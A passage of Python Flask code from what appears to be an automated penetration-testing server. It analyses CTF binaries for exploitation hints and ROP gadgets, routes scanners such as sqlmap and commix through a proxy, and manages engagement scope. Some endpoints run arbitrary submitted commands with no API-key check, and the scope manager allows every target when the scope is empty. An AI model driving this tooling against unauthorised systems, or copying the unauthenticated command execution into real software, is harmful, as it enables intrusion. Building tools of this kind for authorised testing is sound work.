                    if "no canary found" in output:
                        results["exploitation_hints"].append("Stack canary disabled - buffer overflow exploitation possible")
                    if "nx disabled" in output:
                        results["exploitation_hints"].append("NX disabled - shellcode execution on stack possible")
                    if "no pie" in output:
                        results["exploitation_hints"].append("PIE disabled - fixed addresses, ROP/ret2libc easier")
                    if "no relro" in output:
                        results["exploitation_hints"].append("RELRO disabled - GOT overwrite attacks possible")
            except Exception as e:
                results["security_protections"]["error"] = str(e)

        # Strings analysis
        try:
            strings_result = subprocess.run(['strings', binary_path], capture_output=True, text=True, timeout=30)
            if strings_result.returncode == 0:
                strings_output = strings_result.stdout.split('\n')

                # Categorize interesting strings
                interesting_categories = {
                    "functions": [],
                    "format_strings": [],
                    "file_paths": [],
                    "potential_flags": [],
                    "system_calls": []
                }

                for string in strings_output:
                    string = string.strip()
                    if not string:
                        continue

                    # Look for function names
                    if any(func in string for func in ['printf', 'scanf', 'gets', 'strcpy', 'system', 'execve']):
                        interesting_categories["functions"].append(string)

                    # Look for format strings
                    if '%' in string and any(fmt in string for fmt in ['%s', '%d', '%x', '%n']):
                        interesting_categories["format_strings"].append(string)

                    # Look for file paths
                    if string.startswith('/') or '\\' in string:
                        interesting_categories["file_paths"].append(string)

                    # Look for potential flags
                    if any(keyword in string.lower() for keyword in ['flag', 'ctf', 'key', 'password']):
                        interesting_categories["potential_flags"].append(string)

                    # Look for system calls
                    if string in ['sh', 'bash', '/bin/sh', '/bin/bash', 'cmd.exe']:
                        interesting_categories["system_calls"].append(string)

                results["strings_analysis"] = interesting_categories

                # Add exploitation hints based on strings
                if interesting_categories["functions"]:
                    dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf']
                    found_dangerous = [f for f in dangerous_funcs if any(f in s for s in interesting_categories["functions"])]
                    if found_dangerous:
                        results["exploitation_hints"].append(f"Dangerous functions found: {', '.join(found_dangerous)} - potential buffer overflow")

                if interesting_categories["format_strings"]:
                    if any('%n' in s for s in interesting_categories["format_strings"]):
                        results["exploitation_hints"].append("Format string with %n found - potential format string vulnerability")

        except Exception as e:
            results["strings_analysis"]["error"] = str(e)

        # ROP gadgets search
        if find_gadgets and analysis_depth in ["comprehensive", "deep"]:
            try:
                ropgadget_result = subprocess.run(['ROPgadget', '--binary', binary_path, '--only', 'pop|ret'], capture_output=True, text=True, timeout=60)
                if ropgadget_result.returncode == 0:
                    gadget_lines = ropgadget_result.stdout.split('\n')
                    useful_gadgets = []

                    for line in gadget_lines:
                        if 'pop' in line and 'ret' in line:
                            useful_gadgets.append(line.strip())

                    results["gadgets"] = useful_gadgets[:20]  # Limit to first 20 gadgets

                    if useful_gadgets:
                        results["exploitation_hints"].append(f"Found {len(useful_gadgets)} ROP gadgets - ROP chain exploitation possible")
                        results["recommended_tools"].append("ropper")

            except Exception as e:
                results["gadgets"] = [f"Error finding gadgets: {str(e)}"]

        # Function analysis with objdump
        if analysis_depth in ["comprehensive", "deep"]:
            try:
                objdump_result = subprocess.run(['objdump', '-t', binary_path], capture_output=True, text=True, timeout=30)
                if objdump_result.returncode == 0:
                    functions = []
                    for line in objdump_result.stdout.split('\n'):
                        if 'F .text' in line:  # Function in text section
                            parts = line.split()
                            if len(parts) >= 6:
                                func_name = parts[-1]
                                functions.append(func_name)

                    results["interesting_functions"] = functions[:50]  # Limit to first 50 functions
            except Exception as e:
                results["interesting_functions"] = [f"Error analyzing functions: {str(e)}"]

        # Add tool recommendations based on findings
        if results["exploitation_hints"]:
            results["recommended_tools"].extend(["pwntools", "gdb-peda", "one-gadget"])

        if "format string" in str(results["exploitation_hints"]).lower():
            results["recommended_tools"].append("format-string-exploiter")

        logger.info(f"🔬 CTF binary analysis completed | Binary: {binary_path} | Hints: {len(results['exploitation_hints'])}")
        return jsonify({
            "success": True,
            "analysis": results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in CTF binary analyzer: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADVANCED PROCESS MANAGEMENT API ENDPOINTS (v10.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/process/execute-async", methods=["POST"])
def execute_command_async():
    """Execute command asynchronously using enhanced process management"""
    try:
        params = request.json
        command = params.get("command", "")
        context = params.get("context", {})

        if not command:
            return jsonify({"error": "Command parameter is required"}), 400

        # Execute command asynchronously
        task_id = enhanced_process_manager.execute_command_async(command, context)

        logger.info(f"🚀 Async command execution started | Task ID: {task_id}")
        return jsonify({
            "success": True,
            "task_id": task_id,
            "command": command,
            "status": "submitted",
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in async command execution: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/get-task-result/<task_id>", methods=["GET"])
def get_async_task_result(task_id):
    """Get result of asynchronous task"""
    try:
        result = enhanced_process_manager.get_task_result(task_id)

        if result["status"] == "not_found":
            return jsonify({"error": "Task not found"}), 404

        logger.info(f"📋 Task result retrieved | Task ID: {task_id} | Status: {result['status']}")
        return jsonify({
            "success": True,
            "task_id": task_id,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting task result: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/pool-stats", methods=["GET"])
def get_process_pool_stats():
    """Get process pool statistics and performance metrics"""
    try:
        stats = enhanced_process_manager.get_comprehensive_stats()

        logger.info(f"📊 Process pool stats retrieved | Active workers: {stats['process_pool']['active_workers']}")
        return jsonify({
            "success": True,
            "stats": stats,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting pool stats: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/cache-stats", methods=["GET"])
def get_cache_stats():
    """Get advanced cache statistics"""
    try:
        cache_stats = enhanced_process_manager.cache.get_stats()

        logger.info(f"💾 Cache stats retrieved | Hit rate: {cache_stats['hit_rate']:.1f}%")
        return jsonify({
            "success": True,
            "cache_stats": cache_stats,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting cache stats: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/clear-cache", methods=["POST"])
def clear_process_cache():
    """Clear the advanced cache"""
    try:
        enhanced_process_manager.cache.clear()

        logger.info("🧹 Process cache cleared")
        return jsonify({
            "success": True,
            "message": "Cache cleared successfully",
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error clearing cache: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/resource-usage", methods=["GET"])
def get_resource_usage():
    """Get current system resource usage and trends"""
    try:
        current_usage = enhanced_process_manager.resource_monitor.get_current_usage()
        usage_trends = enhanced_process_manager.resource_monitor.get_usage_trends()

        logger.info(f"📈 Resource usage retrieved | CPU: {current_usage['cpu_percent']:.1f}% | Memory: {current_usage['memory_percent']:.1f}%")
        return jsonify({
            "success": True,
            "current_usage": current_usage,
            "usage_trends": usage_trends,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting resource usage: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/performance-dashboard", methods=["GET"])
def get_performance_dashboard():
    """Get performance dashboard data"""
    try:
        dashboard_data = enhanced_process_manager.performance_dashboard.get_summary()
        pool_stats = enhanced_process_manager.process_pool.get_pool_stats()
        resource_usage = enhanced_process_manager.resource_monitor.get_current_usage()

        # Create comprehensive dashboard
        dashboard = {
            "performance_summary": dashboard_data,
            "process_pool": pool_stats,
            "resource_usage": resource_usage,
            "cache_stats": enhanced_process_manager.cache.get_stats(),
            "auto_scaling_status": enhanced_process_manager.auto_scaling_enabled,
            "system_health": {
                "cpu_status": "healthy" if resource_usage["cpu_percent"] < 80 else "warning" if resource_usage["cpu_percent"] < 95 else "critical",
                "memory_status": "healthy" if resource_usage["memory_percent"] < 85 else "warning" if resource_usage["memory_percent"] < 95 else "critical",
                "disk_status": "healthy" if resource_usage["disk_percent"] < 90 else "warning" if resource_usage["disk_percent"] < 98 else "critical"
            }
        }

        logger.info(f"📊 Performance dashboard retrieved | Success rate: {dashboard_data.get('success_rate', 0):.1f}%")
        return jsonify({
            "success": True,
            "dashboard": dashboard,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error getting performance dashboard: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/terminate-gracefully/<int:pid>", methods=["POST"])
def terminate_process_gracefully(pid):
    """Terminate process with graceful degradation"""
    try:
        params = request.json or {}
        timeout = params.get("timeout", 30)

        success = enhanced_process_manager.terminate_process_gracefully(pid, timeout)

        if success:
            logger.info(f"✅ Process {pid} terminated gracefully")
            return jsonify({
                "success": True,
                "message": f"Process {pid} terminated successfully",
                "pid": pid,
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to terminate process {pid}",
                "pid": pid,
                "timestamp": datetime.now().isoformat()
            }), 400

    except Exception as e:
        logger.error(f"💥 Error terminating process {pid}: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/auto-scaling", methods=["POST"])
def configure_auto_scaling():
    """Configure auto-scaling settings"""
    try:
        params = request.json
        enabled = params.get("enabled", True)
        thresholds = params.get("thresholds", {})

        # Update auto-scaling configuration
        enhanced_process_manager.auto_scaling_enabled = enabled

        if thresholds:
            enhanced_process_manager.resource_thresholds.update(thresholds)

        logger.info(f"⚙️ Auto-scaling configured | Enabled: {enabled}")
        return jsonify({
            "success": True,
            "auto_scaling_enabled": enabled,
            "resource_thresholds": enhanced_process_manager.resource_thresholds,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error configuring auto-scaling: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/scale-pool", methods=["POST"])
def manual_scale_pool():
    """Manually scale the process pool"""
    try:
        params = request.json
        action = params.get("action", "")  # "up" or "down"
        count = params.get("count", 1)

        if action not in ["up", "down"]:
            return jsonify({"error": "Action must be 'up' or 'down'"}), 400

        current_stats = enhanced_process_manager.process_pool.get_pool_stats()
        current_workers = current_stats["active_workers"]

        if action == "up":
            max_workers = enhanced_process_manager.process_pool.max_workers
            if current_workers + count <= max_workers:
                enhanced_process_manager.process_pool._scale_up(count)
                new_workers = current_workers + count
                message = f"Scaled up by {count} workers"
            else:
                return jsonify({"error": f"Cannot scale up: would exceed max workers ({max_workers})"}), 400
        else:  # down
            min_workers = enhanced_process_manager.process_pool.min_workers
            if current_workers - count >= min_workers:
                enhanced_process_manager.process_pool._scale_down(count)
                new_workers = current_workers - count
                message = f"Scaled down by {count} workers"
            else:
                return jsonify({"error": f"Cannot scale down: would go below min workers ({min_workers})"}), 400

        logger.info(f"📏 Manual scaling | {message} | Workers: {current_workers} → {new_workers}")
        return jsonify({
            "success": True,
            "message": message,
            "previous_workers": current_workers,
            "current_workers": new_workers,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error scaling pool: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/process/health-check", methods=["GET"])
def process_health_check():
    """Comprehensive health check of the process management system"""
    try:
        # Get all system stats
        comprehensive_stats = enhanced_process_manager.get_comprehensive_stats()

        # Determine overall health
        resource_usage = comprehensive_stats["resource_usage"]
        pool_stats = comprehensive_stats["process_pool"]
        cache_stats = comprehensive_stats["cache"]

        health_score = 100
        issues = []

        # CPU health
        if resource_usage["cpu_percent"] > 95:
            health_score -= 30
            issues.append("Critical CPU usage")
        elif resource_usage["cpu_percent"] > 80:
            health_score -= 15
            issues.append("High CPU usage")

        # Memory health
        if resource_usage["memory_percent"] > 95:
            health_score -= 25
            issues.append("Critical memory usage")
        elif resource_usage["memory_percent"] > 85:
            health_score -= 10
            issues.append("High memory usage")

        # Disk health
        if resource_usage["disk_percent"] > 98:
            health_score -= 20
            issues.append("Critical disk usage")
        elif resource_usage["disk_percent"] > 90:
            health_score -= 5
            issues.append("High disk usage")

        # Process pool health
        if pool_stats["queue_size"] > 50:
            health_score -= 15
            issues.append("High task queue backlog")

        # Cache health
        if cache_stats["hit_rate"] < 30:
            health_score -= 10
            issues.append("Low cache hit rate")

        health_score = max(0, health_score)

        # Determine status
        if health_score >= 90:
            status = "excellent"
        elif health_score >= 75:
            status = "good"
        elif health_score >= 50:
            status = "fair"
        elif health_score >= 25:
            status = "poor"
        else:
            status = "critical"

        health_report = {
            "overall_status": status,
            "health_score": health_score,
            "issues": issues,
            "system_stats": comprehensive_stats,
            "recommendations": []
        }

        # Add recommendations based on issues
        if "High CPU usage" in issues:
            health_report["recommendations"].append("Consider reducing concurrent processes or upgrading CPU")
        if "High memory usage" in issues:
            health_report["recommendations"].append("Clear caches or increase available memory")
        if "High task queue backlog" in issues:
            health_report["recommendations"].append("Scale up process pool or optimize task processing")
        if "Low cache hit rate" in issues:
            health_report["recommendations"].append("Review cache TTL settings or increase cache size")

        logger.info(f"🏥 Health check completed | Status: {status} | Score: {health_score}/100")
        return jsonify({
            "success": True,
            "health_report": health_report,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in health check: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# BANNER AND STARTUP CONFIGURATION
# ============================================================================

# ============================================================================
# INTELLIGENT ERROR HANDLING API ENDPOINTS
# ============================================================================

@app.route("/api/error-handling/statistics", methods=["GET"])
def get_error_statistics():
    """Get error handling statistics"""
    try:
        stats = error_handler.get_error_statistics()
        return jsonify({
            "success": True,
            "statistics": stats,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error getting error statistics: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/test-recovery", methods=["POST"])
def test_error_recovery():
    """Test error recovery system with simulated failures"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "nmap")
        error_type = data.get("error_type", "timeout")
        target = data.get("target", "example.com")

        # Simulate an error for testing
        if error_type == "timeout":
            exception = TimeoutError("Simulated timeout error")
        elif error_type == "permission_denied":
            exception = PermissionError("Simulated permission error")
        elif error_type == "network_unreachable":
            exception = ConnectionError("Simulated network error")
        else:
            exception = Exception(f"Simulated {error_type} error")

        context = {
            "target": target,
            "parameters": data.get("parameters", {}),
            "attempt_count": 1
        }

        # Get recovery strategy
        recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)

        return jsonify({
            "success": True,
            "recovery_strategy": {
                "action": recovery_strategy.action.value,
                "parameters": recovery_strategy.parameters,
                "max_attempts": recovery_strategy.max_attempts,
                "success_probability": recovery_strategy.success_probability,
                "estimated_time": recovery_strategy.estimated_time
            },
            "error_classification": error_handler.classify_error(str(exception), exception).value,
            "alternative_tools": error_handler.tool_alternatives.get(tool_name, []),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error testing recovery system: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/fallback-chains", methods=["GET"])
def get_fallback_chains():
    """Get available fallback tool chains"""
    try:
        operation = request.args.get("operation", "")
        failed_tools = request.args.getlist("failed_tools")

        if operation:
            fallback_chain = degradation_manager.create_fallback_chain(operation, failed_tools)
            return jsonify({
                "success": True,
                "operation": operation,
                "fallback_chain": fallback_chain,
                "is_critical": degradation_manager.is_critical_operation(operation),
                "timestamp": datetime.now().isoformat()
            })
        else:
            return jsonify({
                "success": True,
                "available_operations": list(degradation_manager.fallback_chains.keys()),
                "critical_operations": list(degradation_manager.critical_operations),
                "timestamp": datetime.now().isoformat()
            })

    except Exception as e:
        logger.error(f"Error getting fallback chains: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/execute-with-recovery", methods=["POST"])
def execute_with_recovery_endpoint():
    """Execute a command with intelligent error handling and recovery"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "")
        command = data.get("command", "")
        parameters = data.get("parameters", {})
        max_attempts = data.get("max_attempts", 3)
        use_cache = data.get("use_cache", True)

        if not tool_name or not command:
            return jsonify({"error": "tool_name and command are required"}), 400

        # Execute command with recovery
        result = execute_command_with_recovery(
            tool_name=tool_name,
            command=command,
            parameters=parameters,
            use_cache=use_cache,
            max_attempts=max_attempts
        )

        return jsonify({
            "success": result.get("success", False),
            "result": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error executing command with recovery: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/classify-error", methods=["POST"])
def classify_error_endpoint():
    """Classify an error message"""
    try:
        data = request.get_json()
        error_message = data.get("error_message", "")

        if not error_message:
            return jsonify({"error": "error_message is required"}), 400

        error_type = error_handler.classify_error(error_message)
        recovery_strategies = error_handler.recovery_strategies.get(error_type, [])

        return jsonify({
            "success": True,
            "error_type": error_type.value,
            "recovery_strategies": [
                {
                    "action": strategy.action.value,
                    "parameters": strategy.parameters,
                    "success_probability": strategy.success_probability,
                    "estimated_time": strategy.estimated_time
                }
                for strategy in recovery_strategies
            ],
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error classifying error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/parameter-adjustments", methods=["POST"])
def get_parameter_adjustments():
    """Get parameter adjustments for a tool and error type"""
    try:
        data = request.get_json()
        tool_name = data.get("tool_name", "")
        error_type_str = data.get("error_type", "")
        original_params = data.get("original_params", {})

        if not tool_name or not error_type_str:
            return jsonify({"error": "tool_name and error_type are required"}), 400

        # Convert string to ErrorType enum
        try:
            error_type = ErrorType(error_type_str)
        except ValueError:
            return jsonify({"error": f"Invalid error_type: {error_type_str}"}), 400

        adjusted_params = error_handler.auto_adjust_parameters(tool_name, error_type, original_params)

        return jsonify({
            "success": True,
            "tool_name": tool_name,
            "error_type": error_type.value,
            "original_params": original_params,
            "adjusted_params": adjusted_params,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error getting parameter adjustments: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/error-handling/alternative-tools", methods=["GET"])
def get_alternative_tools():
    """Get alternative tools for a given tool"""
    try:
        tool_name = request.args.get("tool_name", "")

        if not tool_name:
            return jsonify({"error": "tool_name parameter is required"}), 400

        alternatives = error_handler.tool_alternatives.get(tool_name, [])

        return jsonify({
            "success": True,
            "tool_name": tool_name,
            "alternatives": alternatives,
            "has_alternatives": len(alternatives) > 0,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"Error getting alternative tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# GLOBAL PROXY (v7.0) — Route all HTTP tools through Burp Suite / ZAP
# ============================================================================

class ProxyConfig:
    """
    Stores a single global proxy URL that is automatically injected into
    every HTTP-capable tool command when set.

    Persists to ~/.hexstrike/proxy.json between sessions.
    Supported proxy schemes: http://, https://, socks5://
    """

    CONFIG_FILE = Path.home() / ".hexstrike" / "proxy.json"
    # Maps tool name → the CLI flag that precedes the proxy URL
    _TOOL_FLAGS: Dict[str, str] = {
        "httpx":          "--proxy",
        "nuclei":         "-proxy",
        "nikto":          "-useproxy",
        "ffuf":           "-replay-proxy",
        "sqlmap":         "--proxy=",
        "dalfox":         "--proxy",
        "gobuster":       "--proxy",
        "feroxbuster":    "--proxy",
        "katana":         "-proxy",
        "ghauri":         "--proxy=",
        "commix":         "--proxy=",
        "whatweb":        "--proxy",
        "wafw00f":        "-p",
        "wfuzz":          "--proxy",
        "curl":           "-x",
        "wget":           "-e use_proxy=yes -e http_proxy=",
        "wpscan":         "--proxy",
        "smuggler":       "--proxy",
        "corsy":          "-d",       # corsy uses -d for proxy
        "crlfuzz":        "-x",
    }

    def __init__(self):
        self._proxy_url: str = ""
        self._enabled: bool = False
        self._lock = threading.RLock()
        self._load()

    def _load(self):
        try:
            if self.CONFIG_FILE.exists():
                data = json.loads(self.CONFIG_FILE.read_text())
                self._proxy_url = data.get("proxy_url", "")
                self._enabled = data.get("enabled", False)
        except Exception:
            pass

    def _save(self):
        try:
            self.CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
            self.CONFIG_FILE.write_text(json.dumps({
                "proxy_url": self._proxy_url,
                "enabled": self._enabled
            }, indent=2))
        except Exception as e:
            logger.warning(f"Could not save proxy config: {e}")

    def set_proxy(self, proxy_url: str, enabled: bool = True) -> Dict:
        """Set and optionally enable the global proxy."""
        url = proxy_url.strip()
        if not url.startswith(("http://", "https://", "socks5://")):
            raise ValueError("Proxy URL must start with http://, https://, or socks5://")
        with self._lock:
            self._proxy_url = url
            self._enabled = enabled
            self._save()
        logger.info(f"🔀 Global proxy set: {url} (enabled={enabled})")
        return self.status()

    def enable(self) -> Dict:
        with self._lock:
            if not self._proxy_url:
                raise ValueError("No proxy URL configured. Call set_proxy first.")
            self._enabled = True
            self._save()
        return self.status()

    def disable(self) -> Dict:
        with self._lock:
            self._enabled = False
            self._save()
        return self.status()

    def clear(self) -> Dict:
        with self._lock:
            self._proxy_url = ""
            self._enabled = False
            self._save()
        return {"proxy_url": "", "enabled": False, "cleared": True}

    def status(self) -> Dict:
        with self._lock:
            return {
                "proxy_url": self._proxy_url,
                "enabled": self._enabled,
                "supported_tools": list(self._TOOL_FLAGS.keys())
            }

    def inject(self, tool_name: str, command: str) -> str:
        """
        Append the correct proxy flag to *command* if the global proxy is
        enabled and the tool supports it.  Returns command unchanged otherwise.
        """
        with self._lock:
            if not (self._enabled and self._proxy_url):
                return command
            flag = self._TOOL_FLAGS.get(tool_name.lower())
            if not flag:
                return command
            # wget uses a different syntax (no space between flag and URL)
            if "=" in flag:
                return f"{command} {flag}{self._proxy_url}"
            return f"{command} {flag} {self._proxy_url}"


proxy_config = ProxyConfig()


def inject_proxy(tool_name: str, command: str) -> str:
    """Convenience wrapper — call this in every HTTP tool endpoint."""
    return proxy_config.inject(tool_name, command)


# ============================================================================
# SCOPE MANAGEMENT (v7.0) — Validates targets before tool execution
# ============================================================================

class ScopeViolationError(Exception):
    """Raised when a target is not in the defined scope."""
    pass

class ScopeManager:
    """
    Manages the engagement scope: IPs, CIDR ranges, and domain wildcards.
    When scope is non-empty, every target is validated before execution.
    Persists scope to ~/.hexstrike/scope.json between sessions.
    """

    SCOPE_FILE = Path.home() / ".hexstrike" / "scope.json"

    def __init__(self):
        self.targets: Set[str] = set()
        self._lock = threading.RLock()
        self._load_scope()

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------
    def _load_scope(self):
        try:
            if self.SCOPE_FILE.exists():
                data = json.loads(self.SCOPE_FILE.read_text())
                self.targets = set(data.get("targets", []))
                logger.info(f"🎯 Scope loaded: {len(self.targets)} entries from {self.SCOPE_FILE}")
        except Exception as e:
            logger.warning(f"⚠️  Could not load scope file: {e}")
            self.targets = set()

    def save_scope(self):
        try:
            self.SCOPE_FILE.parent.mkdir(parents=True, exist_ok=True)
            self.SCOPE_FILE.write_text(json.dumps({"targets": list(self.targets)}, indent=2))
        except Exception as e:
            logger.warning(f"⚠️  Could not save scope file: {e}")

    # ------------------------------------------------------------------
    # Core validation
    # ------------------------------------------------------------------
    def _normalize(self, target: str) -> str:
        return target.strip().lower()

    def _matches(self, target: str) -> bool:
        """Return True if target matches any scope entry (IP, CIDR, domain, wildcard)."""
        target = self._normalize(target)
        if not target:
            return True  # empty target → skip check
        for entry in self.targets:
            entry = self._normalize(entry)
            try:
                # Try CIDR match
                network = ipaddress.ip_network(entry, strict=False)
                try:
                    addr = ipaddress.ip_address(target)
                    if addr in network:
                        return True
                except ValueError:
                    pass
            except ValueError:
                pass
            # Wildcard domain match (e.g. *.example.com)
            if fnmatch.fnmatch(target, entry):
                return True
            # Exact match or subdomain suffix
            if target == entry or target.endswith('.' + entry):
                return True
        return False

    def is_in_scope(self, target: str) -> bool:
        """Returns True if target is in scope OR scope is empty (unrestricted)."""
        with self._lock:
            if not self.targets:
                return True  # No scope defined → allow all
            return self._matches(target)

    def validate_or_raise(self, target: str):
        """Raises ScopeViolationError if target is out of scope."""
        if not self.is_in_scope(target):
            msg = f"Target '{target}' is OUT OF SCOPE. Add it to scope first via /api/scope/add"
            logger.error(f"🚫 SCOPE VIOLATION: {msg}")
            raise ScopeViolationError(msg)

    # ------------------------------------------------------------------
    # Management
    # ------------------------------------------------------------------
    def add_target(self, target: str):
        with self._lock:
            self.targets.add(self._normalize(target))
            self.save_scope()

    def remove_target(self, target: str):
        with self._lock:
            self.targets.discard(self._normalize(target))
            self.save_scope()

    def set_targets(self, targets: List[str]):
        with self._lock:
            self.targets = {self._normalize(t) for t in targets}
            self.save_scope()

    def clear(self):
        with self._lock:
            self.targets.clear()
            self.save_scope()

    def list_scope(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "targets": sorted(self.targets),
                "count": len(self.targets),
                "unrestricted": len(self.targets) == 0
            }

# Global scope manager instance
scope_manager = ScopeManager()

# ------------------------------------------------------------------
# Scope API Endpoints
# ------------------------------------------------------------------

@app.route("/api/scope/set", methods=["POST"])
@require_api_key
def scope_set():
    """Set the entire scope (replaces existing)."""
    try:
        params = request.json or {}
        targets = params.get("targets", [])
        if not isinstance(targets, list):
            return jsonify({"error": "targets must be a list"}), 400
        scope_manager.set_targets(targets)
        logger.info(f"🎯 Scope set: {targets}")
        return jsonify({"success": True, "scope": scope_manager.list_scope(), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/scope/add", methods=["POST"])
@require_api_key
def scope_add():
    """Add a target to the scope."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        scope_manager.add_target(target)
        logger.info(f"🎯 Added to scope: {target}")
        return jsonify({"success": True, "added": target, "scope": scope_manager.list_scope(), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/scope/remove", methods=["DELETE", "POST"])
@require_api_key
def scope_remove():
    """Remove a target from the scope."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        scope_manager.remove_target(target)
        logger.info(f"🗑️  Removed from scope: {target}")
        return jsonify({"success": True, "removed": target, "scope": scope_manager.list_scope(), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/scope/list", methods=["GET"])
def scope_list():
    """List current scope."""
    try:
        return jsonify({"success": True, **scope_manager.list_scope(), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/scope/validate", methods=["POST"])
def scope_validate():
    """Check if a target is in scope."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        in_scope = scope_manager.is_in_scope(target)
        return jsonify({"success": True, "target": target, "in_scope": in_scope, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/scope/clear", methods=["POST"])
@require_api_key
def scope_clear():
    """Clear all scope entries (unrestricted mode)."""
    try:
        scope_manager.clear()
        logger.info("🧹 Scope cleared — running in unrestricted mode")
        return jsonify({"success": True, "message": "Scope cleared — all targets now allowed", "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# PROXY CONFIGURATION ENDPOINTS (v7.0)
# ============================================================================

@app.route("/api/config/proxy", methods=["GET"])
@require_api_key
def proxy_get():
    """Return the current global proxy configuration."""
    return jsonify(proxy_config.status())


@app.route("/api/config/proxy", methods=["POST"])
@require_api_key
def proxy_set():
    """
    Set (and optionally enable) the global proxy used by all HTTP tools.

    Body:
      proxy_url  — required, e.g. "http://127.0.0.1:8080"
      enabled    — optional bool, default true
    """
    try:
        params = request.json or {}
        proxy_url = params.get("proxy_url", "").strip()
        if not proxy_url:
            return jsonify({"error": "proxy_url is required"}), 400
        enabled = params.get("enabled", True)
        result = proxy_config.set_proxy(proxy_url, enabled)
        result["timestamp"] = datetime.now().isoformat()
        return jsonify(result)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/config/proxy/enable", methods=["POST"])
@require_api_key
def proxy_enable():
    """Enable the previously configured global proxy."""
    try:
        result = proxy_config.enable()
        result["timestamp"] = datetime.now().isoformat()
        return jsonify(result)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/config/proxy/disable", methods=["POST"])
@require_api_key
def proxy_disable():
    """Disable the global proxy without removing the stored URL."""
    try:
        result = proxy_config.disable()
        result["timestamp"] = datetime.now().isoformat()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/config/proxy/clear", methods=["POST"])
@require_api_key
def proxy_clear():
    """Remove the global proxy URL and disable it."""
    try:
        result = proxy_config.clear()
        result["timestamp"] = datetime.now().isoformat()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# REPORTING ENGINE (v7.0) — HTML/PDF report generation
# ============================================================================

@dataclass
class Finding:
    """Represents a single security finding."""
    id: str
    title: str
    severity: str          # critical / high / medium / low / info
    cvss_score: float
    target: str
